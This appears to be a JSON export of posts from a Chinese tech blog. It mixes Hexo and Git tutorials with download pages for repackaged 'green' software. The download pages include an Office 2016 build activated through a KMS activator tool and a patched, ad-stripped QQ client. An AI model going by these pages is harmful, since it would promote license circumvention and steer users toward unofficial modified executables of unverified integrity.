sf0a","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"Microsoft Office 2003-2016 三 / 四合一 绿色精简版","slug":"software-microsoft-office","date":"2017-02-14T05:22:13.000Z","updated":"2017-02-14T05:22:13.000Z","comments":true,"path":"software-microsoft-office.html","permalink":"https://sobaigu.com/software-microsoft-office.html","excerpt":"","text":"基本信息 程序类型：精简/绿色特别版 界面语言：中文英文 文件大小：68 m 支持系统：Windows 官方主页：www.microsoft.com 软件介绍 Microsoft Office是一套由微软公司开发的办公软件套装，它可以在Microsoft Windows、Windows Phone、Apple Macintosh、 iOS和 Android等系统上运行。与其他办公室应用程序一样，它包括联合的服务器和基于互联网的服务。从2007版的Office被称为“Office System”而不叫“Office Suite”，反映出它们包括服务器的事实。 Office常是制作文档文件的标准，而且有一些其他产品不存在的特性，但是其他产品也有Office缺少的特性。自从Microsoft 2007 Office System开始，有一个和以前版本差异很大的用户界面，该界面被称为Ribbon界面，并沿用在Microsoft Office 2010、Microsoft Office 2013和Microsoft Office 2016中。 Office2016 四合一/三合一绿色精简版说明： 支持Win7/Win8/8.1/Win10系统32及64位 具体包含Word、Excel、Ppt、Access 四大组件（含VBA ）（另有三合一补丁提供）；安装完成后为30天试用，可自行KMS激活；支持联机模板、支持规划求解、分析等excel加载项；仅适合普通文档编辑使用！ 永久激活方法 备份还原激活信息 永久激活后，运行 !)激活备份还原.cmd，选 1 备份激活信息。 重装后恢复，运行 !)激活备份还原.cmd，选 2 恢复激活信息， 在office20xx文件夹中右键打开dos窗口，运行 cscript Office**\\ospp.vbs /inpkey:XXXXX-XXXXX-XXXXX 在线联网激活方法 在office20xx绿色版安装文件夹中打开dos窗口，运行 cscript Office**\\ospp.vbs /inpkey:XXXXX-XXXXX-XXXXX script Office**\\ospp.vbs /act （xxxxx为永久激活key，且必须与备份的激活信息文件相配套） 安装注意：右键管理员权限运行 !)安装.cmd KMS激活 使用工具很方便就激活，参考：HEU KMS Activator-Windows系统或office激活工具迷你版 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 ktbj","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"比目鱼复活可用版-BT种子搜索神器","slug":"software-bt-search-bimuyu-survival","date":"2017-02-12T04:21:33.000Z","updated":"2017-02-12T04:21:33.000Z","comments":true,"path":"software-bt-search-bimuyu-survival.html","permalink":"https://sobaigu.com/software-bt-search-bimuyu-survival.html","excerpt":"","text":"基本信息 程序类型：绿色特别版 界面语言：中文 文件大小：2.5 m 支持系统：Windows 官方主页：www.fishlee.net 软件介绍 比目鱼（原BT资源搜索助手），一款超级强大的基于各大BT搜索引擎的资源搜索工具！比目鱼不是P2P的，因此它不具备P2P搜索所特有的资源不稳定以及搜索速度偏慢的问题，但同时也有受网络和服务器影响较大的缺点。比目鱼整合若干BT资源搜索引擎，意在为资源的搜索和使用提供更简单便捷的方法。 如果无法运行请安装.NET4.0，点此从官网下载 软件使用的搜索引擎对网络依赖较大，如果出现错误无法搜索的情况，很可能是因为特殊的关键字或网络因素导致您无法访问对应的引擎。个别引擎可能需上网代理服务器才可以正常使用。对于无法成功下载种子的资源，请尝试直接复制磁力链到下载工具中下载。 科学上网可参见： Shadowsocks相关文章 爬墙之Switchysharp for Chrome_科学上网 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 6rpl","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"解决maupassant-hexo主题点击评论不能自动跳转","slug":"hexo-goto-comments-in-maupassant-theme","date":"2017-02-11T05:01:37.000Z","updated":"2017-03-22T08:01:37.000Z","comments":true,"path":"hexo-goto-comments-in-maupassant-theme.html","permalink":"https://sobaigu.com/hexo-goto-comments-in-maupassant-theme.html","excerpt":"","text":"前言 maupassant-hexo主题在首页及文章页会自动统计文章对应评论，并可以在点击评论时自动跳转到评论位置。主题本身支持多说或Disqus评论，在主题中有对应设置，当设置使用多说评论时，该超链接自动在文章地址后添加#comments，以此实现跳转到文章对应的评论位置。 可在实际使用时发现，评论数能自动统计，但点击该超链接却不会自动跳转到评论层。查看调试信息，整篇文章中并不存在id=comments或者class=comments，所以点击并不会发生导航跳转。 解决方案 该问题应该是主题的bug，我们可以自行将其修正。 找到主题模板themes\\maupassant\\layout\\post.jade，可以找到如下内容： 1234if theme.duoshuo a.ds-thread-count(data-thread-key=page.path, href=url_for(page.path) + &#x27;#comments&#x27;) //就是这个自动添加的`#comments`if theme.disqus a.disqus-comment-count(data-disqus-identifier=page.path, href=url_for(page.path) + &#x27;#disqus_thread&#x27;) chrome或者edge浏览器按f12打开调试界面，可看到多说评论框中有个#ds-thread锚点，和下面的disqus评论一样，主题作者在写多说评论时应该是有疏忽的，我们只要对应修改就可以了 1234if theme.duoshuo a.ds-thread-count(data-thread-key=page.path, href=url_for(page.path) + &#x27;#ds-thread&#x27;)if theme.disqus a.disqus-comment-count(data-disqus-identifier=page.path, href=url_for(page.path) + &#x27;#disqus_thread&#x27;) 按如上改完，保存就可以预览到效果了，但首页的评论统计点进去还是不行，可能是打开时多说评论加载速度问题，此处貌似也没什么用，还影响首页打开速度，干脆干掉（看主题作者的博客这个地方也干掉了）。 2017年3月22日-多说退出历史舞台，换成了Disqus评论，重新把首页显示评论数开起来了 打开首页模板themes\\maupassant\\layout\\index.jade，将加载该注释统计图标的代码注释掉即可。 1234//if theme.duoshuo //a.ds-thread-count(data-thread-key=post.path, href=url_for(post.path) + &#x27;#ds-thread&#x27;)//if theme.disqus //a.disqus-comment-count(data-disqus-identifier=post.path, href=url_for(post.path) + &#x27;#disqus_thread&#x27;)","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"Hexo","slug":"Hexo","permalink":"https://sobaigu.com/tags/Hexo/"}]},{"title":"腾讯QQ_去广告显IP绿色版","slug":"software-QQ-noad","date":"2017-02-04T01:38:39.000Z","updated":"2017-02-24T01:38:39.000Z","comments":true,"path":"software-QQ-noad.html","permalink":"https://sobaigu.com/software-QQ-noad.html","excerpt":"","text":"基本信息 程序类型：安装/绿色版 界面语言：中文 文件大小： 53.5 m 支持系统：Windows/OSX 官方主页：www.qq.com 软件介绍 腾讯QQ，用户最多聊天必备软件。不仅可以在各类通讯终端上通过QQ聊天交友，还能进行免费的视频、语音通话，或者随时随地收发重要文件等。 版本不一定要最新,够用稳定就好 修改说明 去除插件效验,精简无用文件 去除广告组件及各种广告 去除QQ秀(可选安装) 去除移动设备插入弹窗 禁止生成个别垃圾文件,禁止后台生成Logs文件夹 去除群多图和离隐无线抖 去除主面板搜索框(可选安装) 禁止Bin目录下载QQCallxx随机程序 去除主菜单和设置里的“软件更新” 主面板完整显示QQ昵称(最小宽度时无省略号) 去除主面板和锁定高宽最小限制(可以缩小成一条工具栏) 去除右下角新闻弹窗(可选安装)(源自：http://www.laibude.com) 默认已使用老李的扣扣小清新补丁8.8(源自：http://www.laibude.com) 集成QQ收藏·Outlook助手V1.1，安装前请先关闭 Outlook，使用方法：http://kf.qq.com/faq/120509Uvu67N141204Zr2qyu.html Win7~Win10 托盘图标，原作者来自 PCBeta 的 435312561，感谢！修改详情：http://bbs.pcbeta.com/viewthread-1653162-1-1.html 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 lc9s","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"在MarkDown文档中添加jQuery折叠面板","slug":"markdown-document-with-accordion-collapsible","date":"2017-02-01T12:54:21.000Z","updated":"2017-02-01T12:54:21.000Z","comments":true,"path":"markdown-document-with-accordion-collapsible.html","permalink":"https://sobaigu.com/markdown-document-with-accordion-collapsible.html","excerpt":"","text":"折腾Hexo博客,做了个软件整理收集页,在首席前端顾问蔡老板的指点下,终于实现了文章中使用折叠面板的功能,现记录如下. 因为想整站都有这样的效果,所以直接集成到使用的主题中,本站使用的是maupassant主题,其他主题应该大同小异,仅供参考. 改造主题 新建定义class或id的js,如我新建了个accordion.js,里面的内容如下 123$(function() &#123; $( &quot;.accordion&quot; ).accordion();&#125;); 如果用&lt;div id=accordion&gt;定义,那么需改成#accordion 123$(function() &#123; $( &quot;#accordion&quot; ).accordion();&#125;); 在主题目录/layout/_partial/after_footer.jade后面添加如下代码 123link(rel=&#x27;stylesheet&#x27;, href=&#x27;//cdn.bootcdn.net/ajax/libs/jqueryui/1.10.4/themes/smoothness/jquery-ui.css&#x27;)script(type=&#x27;text/javascript&#x27;, src=&#x27;//cdn.bootcdn.net/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js&#x27;)script(type=&#x27;text/javascript&#x27;, src=url_for(theme.js) + &#x27;/accordion.js&#x27;) 上面的src=url_for(theme.js) + '/accordion.js'表示引用的主题放js的目录下的accordion.js 文章中添加折叠class 将需要折叠的内容用&lt;div&gt;引用起来,如要隐藏二级标题下的内容,就类似于下面这样 12345678910&lt;div class=&quot;accordion&quot;&gt;## 隐藏x隐藏内容x## 隐藏y隐藏内容y&lt;/div&gt; 结合主题的修改,此时该文章就会在初次打开时展开第一个内容块,点击隐藏y则展开对应的内容,同时其他内容隐藏.效果如下演示 隐藏x 隐藏内容x 隐藏y 隐藏内容y 如果块引用里面有不同的层级,如`h2`和`h3`混合,会出现样式错乱,不知道怎么搞,所以把层级都搞成一样即可. 注意如果要隐藏的是表格,在MarkDown文档编辑时记得在&lt;div&gt;下面留出一行空行,否则会导致MarkDown格式不识别. 样式改进 直接上面的做法会发现存在以下问题 标题和内容之间有间隙 展开框高度固定—也不知道在哪改 最后还有一行空白 我们可以在主题style.css中添加样式解决 123456789101112/*表格高度自适应*/.accordion table &#123; height: 100% !important;&#125;/*隐藏空行*/p.ui-accordion-header:last-child &#123; display:none;&#125;/*去掉标题下面的间隙*/.post .post-content h2 &#123; margin: 1.4em 0 0em;&#125; 前面主题中直接引用的jquery-ui.css,里面一堆样式其实是用不到的,可以按自己的需求挑选需要的部分直接写在主题的style.css中,但某些图标什么的也相应的需要下载,各有利弊. 最后效果见给父老乡亲的软件宝库 参考文档 折叠面板（Accordion） 使用 Hexo 搭建博客的深度优化与定制","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"Hexo","slug":"Hexo","permalink":"https://sobaigu.com/tags/Hexo/"}]},{"title":"PDF-XChange Viewer Pro","slug":"software-pdf-xchange","date":"2017-01-25T07:36:37.000Z","updated":"2017-01-25T07:36:37.000Z","comments":true,"path":"software-pdf-xchange.html","permalink":"https://sobaigu.com/software-pdf-xchange.html","excerpt":"","text":"基本信息 程序类型：绿色特别版 界面语言：中文/英文 文件大小： 9.3 m 支持系统：Windows 官方主页：www.tracker-software.com/product/pdf-xchange-viewer 软件介绍 PDF-XChange Viewer，免费强大的PDF阅读器、PDF编辑器！软件基础功能免费，适合日常使用，轻巧快速、打开PDF文件速度快。它具有OCR功能，支持导出文件，提取文本和图像、图片格式；支持在PDF文档上任意位置加上注解、中文注释、输入文字、建立文字区域、箭头、框线，批量搜索等功能。 PDF-XChange Viewer软件特色： OCR功能，支持自定义图像或被扫描的PDF文件，制作全文可搜索文本的PDF； 支持为任何的PDF文档添加批注和注释，无需获得Adobe的PDF工具的认证； 支持添加自定义的图像或者PDF文档；支持从PDF页面和文档中提取文本； 支持用文本和对象标识所需的页面；内置测量工具，支持周长和面积的计算； 在打印机模式下，支持直接在PDF页面上输入，无需Adobe的格式要求； 支持导出PDF页面或整个文件到任何所支持的图像格式，例如BMP, JPEG, TIFF, PNG等格式； 支持PDF安全设置，包括40/128位RC4和128/256位AES加密的密码和权限的添加和编辑； 注意：该软件需安装.NETframework 框架才能运行，安装过程除了OCR等其它增强功能收费外，用户安装可选免费版，软件含中文语言，安装后如果默认语言设置不合适，可在编辑→参数设置中进行修改。 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 booq","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"PDF Shaper_PDF文档转换工具","slug":"software-PDF-Shaper","date":"2017-01-22T08:36:15.000Z","updated":"2017-01-22T08:36:15.000Z","comments":true,"path":"software-PDF-Shaper.html","permalink":"https://sobaigu.com/software-PDF-Shaper.html","excerpt":"","text":"基本信息 程序类型：绿色特别版 界面语言：中文/英文 文件大小： 7.2 m 支持系统：Windows 官方主页：www.pdfshaper.com 软件介绍 PDF Shaper – 免费实用的多功能PDF工具箱！这款PDF转换器包含了很多非常实用的工具，可以轻松的把 PDF 转成 Word，PDF 转图像，PDF 加密等等。它还可以合并，分割，加密和解密 PDF，图像转换为 PDF，PDF 转换为 RTF 或 图像，从 PDF 中提取文本和图像，转换或裁剪已签名的PDF等。PDF Shaper，原生免费仅限非商业用途，体积小巧，资源占用低，界面简单易用，支持批处理、支持Unicode文本。 PDF Shaper 的功能可以说几乎覆盖了日常PDF操作的方方面面，并且它拥有无需安装的便携特性，整个软件虽然功能众多，但体积小巧；由于其界面直观优雅，所以无需学习简单易用！实乃PDF工具必备利器！ PDF Shaper 功能特性： 批量提取PDF中的文本、图像等内容； PDF转换为Word、PDF转换为图像、或将图像转换为PDF； 从PDF提取页面作为单独的PDF文件；分割PDF文件； 合并多个PDF文件为一个PDF即PDF合并功能； 加密和解密PDF,设置用户权限 旋转、转换或裁剪已签名的PDF,设置或修改PDF元数据。 PDFShaper v3.5是经典版本 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 booq","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"PDG reader_pdg电子书阅读器","slug":"software-pdg-reader","date":"2017-01-17T08:47:50.000Z","updated":"2017-01-22T08:47:50.000Z","comments":true,"path":"software-pdg-reader.html","permalink":"https://sobaigu.com/software-pdg-reader.html","excerpt":"","text":"基本信息 程序类型：绿色版 界面语言：中文英文 文件大小： 1.1 m 支持系统：Windows 官方主页： 软件介绍 这是个迷你pdg格式文档阅读器,xp时代的小软件,在如今依然可用。本程序为Professional版，支持目前所有pdg格式。 特色功能： zip,rar压缩的pdg书籍的阅读—pdg文档在压缩包里不用解压,直接就可以关联打开 多窗口设计；支持打印当前页或者保存当前页为bmp；OCR,旋转；用户背景支持jpeg 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 booq","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"Foxit Reader_福昕PDF阅读器简体中文纯净版","slug":"software-Foxit-Reader","date":"2017-01-12T07:36:37.000Z","updated":"2017-01-22T07:36:37.000Z","comments":true,"path":"software-Foxit-Reader.html","permalink":"https://sobaigu.com/software-Foxit-Reader.html","excerpt":"","text":"基本信息 程序类型：绿色版 界面语言：中文/英文 文件大小： 4.5 m 支持系统：Windows/Linux/OSX 官方主页：www.foxitsoftware.cn 软件介绍 Foxit Reader，福昕阅读器 – 阅读PDF文档的最佳选择。更快更轻，超越Adobe Reader；全新Ribbon界面，全球用户数亿；福昕PDF文档阅读器实用强大，体积小、功能丰富，完全免支持PDF文档手写签名、插入印章；更多安全控制包括Foxit DRM内容管理插件；唯一支持微软AD RMS对PDF文档的安全应用。 福昕软件也越来越大了,经典的4.3.1版本仍然很强大,没什么特别需求就不用更新最新版本了 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 booq","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"Hexo博客添加google adsense广告","slug":"hexo-add-google-adsense","date":"2017-01-04T05:23:47.000Z","updated":"2017-01-04T05:23:47.000Z","comments":true,"path":"hexo-add-google-adsense.html","permalink":"https://sobaigu.com/hexo-add-google-adsense.html","excerpt":"","text":"经过一周的折腾,原WordPress中的内容已经完全转到Hexo了,也把博客中涉及的代码块,内链等都修正了一把. 刚好,自己google adsense中还有点钱,挂个adsense也不错,但根据Hexo博客用到的主题不同,使用的语言就不同,本站使用的是maupassant主题,简洁大气,但jade语法完全不会,直接使用google adsense将会有各种无法解析的错误. 经过一番折腾,终于搞定,现将方法记录如下. 在主题中添加广告位置 此处与自己在用的maupassant主题为例,其他的大同小异. 打开主题目录下的_config.yml文件,添加个广告控制开关 123widgets_on_small_screens: false ## Set to true to enable widgets on small screens.show_ad_post: true ##如需要开启广告位,设置为 truemenu: 打开主题模板,在对应位置添加广告代码.我这是在文章页底部,评论框上方添加,所以打开主题目录\\layout\\post.jade 12345#这里的代码已经是按jade语法改造后的代码if theme.show_ad_post == true #对应主题配置中添加的开关 script(async src=&quot;//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js&quot;) ins.adsbygoogle(style=&quot;display:block&quot; data-ad-client=&quot;ca-pub-xxx&quot; data-ad-slot=&quot;xxx&quot; data-ad-format=&quot;auto&quot;) script (adsbygoogle = window.adsbygoogle || []).push(&#123;&#125;); jade变更为pug后，代码格式稍有变更： 12345script(async=&#x27;&#x27; src=&quot;//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js&quot;)ins.adsbygoogle(style=&quot;display:block&quot; data-ad-client=&quot;#&#123;theme.adsense.google_ad_client&#125;&quot; data-ad-format=&quot;auto&quot;)script. (adsbygoogle = window.adsbygoogle || []).push(&#123;&#125;); 保存发布即可看到效果.如果是在本地测试,那么请hosts劫持访问才会显示广告. 获取adsense代码并按jade语法改造 原生广告代码如下 12345678910&lt;script async src=&quot;//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js&quot;&gt;&lt;/script&gt;&lt;!-- 自适应 --&gt;&lt;ins class=&quot;adsbygoogle&quot; style=&quot;display:block&quot; data-ad-client=&quot;ca-pub-xxx&quot; data-ad-slot=&quot;xxx&quot; data-ad-format=&quot;auto&quot;&gt;&lt;/ins&gt;&lt;script&gt;(adsbygoogle = window.adsbygoogle || []).push(&#123;&#125;);&lt;/script&gt; 这样直接贴到主题模板中或在模板中引用的时候将会提示错误 123456ERROR Process failed: layout/_custom_ad/google.jadeError: C:\\Users\\xxx\\Hexo\\themes\\maupassant\\layout\\_custom_ad\\google.jade:6... \\&gt; 6| style=&quot;display:block&quot;...unexpected token &quot;indent&quot; 我们需要将其按jade语法改造成这样才可以 123script(async src=&quot;//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js&quot;)ins.adsbygoogle(style=&quot;display:block&quot; data-ad-client=&quot;ca-pub-xxx&quot; data-ad-slot=&quot;xxx&quot; data-ad-format=&quot;auto&quot;)script (adsbygoogle = window.adsbygoogle || []).push(&#123;&#125;); 也尝试过把代码放在html中,然后主题中include html,但这样会造成一个页面里有多个&lt;head&gt;等网页元素,相当于产生了多重引用,不推荐.","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"Hexo","slug":"Hexo","permalink":"https://sobaigu.com/tags/Hexo/"}]},{"title":"联想笔记本fn快捷按键设置","slug":"fn-ctrl-on-lenovo","date":"2016-12-30T07:49:56.000Z","updated":"2016-12-31T07:49:56.000Z","comments":true,"path":"fn-ctrl-on-lenovo.html","permalink":"https://sobaigu.com/fn-ctrl-on-lenovo.html","excerpt":"","text":"联想ThinkPad系列的笔记本电脑脑残地把键盘最上面一行的功能键设置为默认功能，而其上面的F1~F12功能需要通过Fn+F1~F12来实现，这对于用一些软件的快捷功能非常不方便。 如果需要改为直接按F1~F12即实现相应的功能，而其它调节音量、屏幕亮度等则通过按Fn+相应的功能键来实现，可采用如下方法： 通过进入BIOS来实现 开机出现Thinkpad的LOGO字样时，按下F1键，进入BIOS； 找到CONFIG&gt;Keyboard/Mouse&gt;Change to &quot;f1-f12 keys”,按回车更改为Legacy； 然后保存退出（按F10或Fn+F10）。 直接在键盘上切换 按键盘上的Fn+Esc来锁定Fn功能，此时Fn上的指示灯亮。这时F1~F12为F键功能，若想用调节音量、屏幕亮度的功能，则需要按Fn+相应的功能键； 再次按键盘上的Fn+Esc来解锁Fn功能，此时Fn上的指示灯熄灭。这时要调节音频、屏幕亮度等功能，直接按相应的键；若要用F1~F12，则需要通过按Fn+F1~F12来实现。 这种方法更好一些，方便切换，无需重启系统。","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://sobaigu.com/tags/Windows/"}]},{"title":"Git强制删除提交到远程版本库的数据或版本记录","slug":"use-git","date":"2016-12-28T07:05:24.000Z","updated":"2017-01-28T07:05:24.000Z","comments":true,"path":"use-git.html","permalink":"https://sobaigu.com/use-git.html","excerpt":"Git新手，测试的时候提交了一堆记录，有洁癖看了总是不爽，而且换了个git托管商提交记录居然还在，只能找资料按教程一步步删除了。 比如提交了： test3 test2 test1","text":"Git新手，测试的时候提交了一堆记录，有洁癖看了总是不爽，而且换了个git托管商提交记录居然还在，只能找资料按教程一步步删除了。 比如提交了： test3 test2 test1 删除提交记录及更改 123git reset --hard HEAD^ #删除最后1次的提交记录git reset --hard HEAD~2 # 删除最近2次提交git push --force #已经提交到远程仓库了，那就需要这个命令将本地库强行同步到远端库覆盖掉 删提交记录但保留更改 需要用到下面的命令： 1git rebase -i &lt;upstream&gt; #&lt;upstream&gt;为需要删除的提交的前一个提交 上面命令执行完会自动打开Interactive Rebase，将pick test2 那行改成squash, 保存退出. 之后可能 git 会提示出现conflict，根据提示完成处理。 squash的意义解释: meld into previous commit, 也就是&quot;熔入前一个提交中&quot;, 所以是先 pick a, 使用 a 提交, 然后 squash b, 把 b 熔入前一个提交中. 在 rebase 保存退出后, 随后的提示信息是由 squash 命令触发的, 此时你可以对熔合后的 commit message 进行编辑, 而不需要在结束后 git commit --amend. 作者：黄鋆 链接：https://www.zhihu.com/question/22132675/answer/20420691 接着就是把本地内容 Force Push 到远端完成 1git push -f #执行强制推送 再看提交记录,果然是清爽多了.","categories":[{"name":"攒知识","slug":"攒知识","permalink":"https://sobaigu.com/categories/%E6%94%92%E7%9F%A5%E8%AF%86/"}],"tags":[{"name":"混技能","slug":"混技能","permalink":"https://sobaigu.com/tags/%E6%B7%B7%E6%8A%80%E8%83%BD/"}]},{"title":"开始新的折腾，Hexo博客Git-VPS部署完整记录","slug":"Hexo-git-to-vps","date":"2016-12-23T15:48:54.000Z","updated":"2017-02-23T01:32:34.000Z","comments":true,"path":"Hexo-git-to-vps.html","permalink":"https://sobaigu.com/Hexo-git-to-vps.html","excerpt":"","text":"本文章部分知识已经有点久远了，可能有些知识会不适用，建议去参考官方文档，最近发现网友 这篇 方案 还是更合理，可以参考 很长时间没有料理博客了，算算上一次正儿八经写篇文章居然是年初…今天偶尔打开，居然没有要写点什么的欲望。 看久了WordPress，突然有点厌倦了.正好最近喜欢上MarkDown文档格式，脑子一热，索性就把WordPress舍弃了，折腾下Hexo，极简风格看上去也不错。日常就记录点打杂琐事，分享个好用的软件，完全能满足一个半吊子打杂工的需求。 Hexo博客部署方案 本地编写MarkDown文档→本地Hexo解析成静态页→提交到VPS上的Git和GitHub等多仓库→Nginx对外服务→用户访问 本地编写MarkDown文档→本地Hexo解析成静态页→提交到GitHub→直接用GitHub Page资源→用户访问 本地编写MarkDown文档→自动同步到VPS并安装Hexo服务解析成静态页→Nginx对外服务→用户访问 本地编写MarkDown文档→自动同步到VPS并安装Hexo服务解析成静态页→Hexo server对外服务→用户访问 各种方案无非是在哪解析静态页，文件怎么提交流转的不同。大家可根据自己的需求选择方案，各方案都有优缺点，这里暂且选择第一种方案。 第一种方案的优点是: VPS上只需要安装Git和Nginx，不用Git也要用其他工具把文件同步上去，那就索性装个Git自动同步吧 不在VPS上装Hexo服务，节省点资源 Git提交后利用Git的post-receive完成自动部署到网站根目录 文件同时提交到GitHub和VPS，这样有个备份，VPS不行了直接改下DNS解析就可以无缝过渡 Git上能保留完整的修改记录 当然，也有缺点: 需要在写文档的机器上安装Hexo，换个电脑用需要重新装 在解放区，GitHub同步有点坑 以后兴许会选择在VPS上部署Hexo，仍然git管理，有更新的时候自动触发VPS上编译，这样就不需要在多个工作机上安装Hexo环境了。 需要安装的环境 软件产品介绍就不写了，图片也懒得贴，有不清楚的可以参考相关官方文档或者自行google搜索。 VPS上安装 Nginx 提供网站服务程序 Git 自动从Git上checkout静态页到网站根目录 写文档的电脑要用到 Node.js Hexo基于Node.js写的，需要提供Hexo依赖环境 Git Git客户端，将静态页提交到GitHub等仓库托管服务商 -Hexo d命令也用到git命令，能自动提交到对应的仓库 Hexo MarkDown解析编译成静态页 MarkDown编辑器 更好更快地写MarkDown格式文档，不屑的直接用notepad或其他代notepad编辑器也行 如果是编辑单个文档，这里给安利个开源，免费，跨平台，简洁，高颜值编辑器:Moeditor或者Typora，你值得拥有 如果是整站管理Hexo文章，那就用GitHub出的Atom吧，原生支持MarkDown，集成Git显色状态 实施步骤 GitHub设置 创建个仓库，仓库命名格式必须为:GitHub用户名.github.io，然后根据提示一直下一步即可。等有静态页提交到这个仓库就可以使用Github Pages静态主页，免费的静态站点不要白不要。 Head over to GitHub and create a new repository named username.github.io， where username is your username (or organization name) on GitHub. 如果要把自己的网站域名直接指向github page页，那么就登录页面GitHub，对着个仓库进行别名设置，设置了别名就不能用https，界面上有说明，就不贴图了。 coding page等托管商设置也大同小异 VPS设置 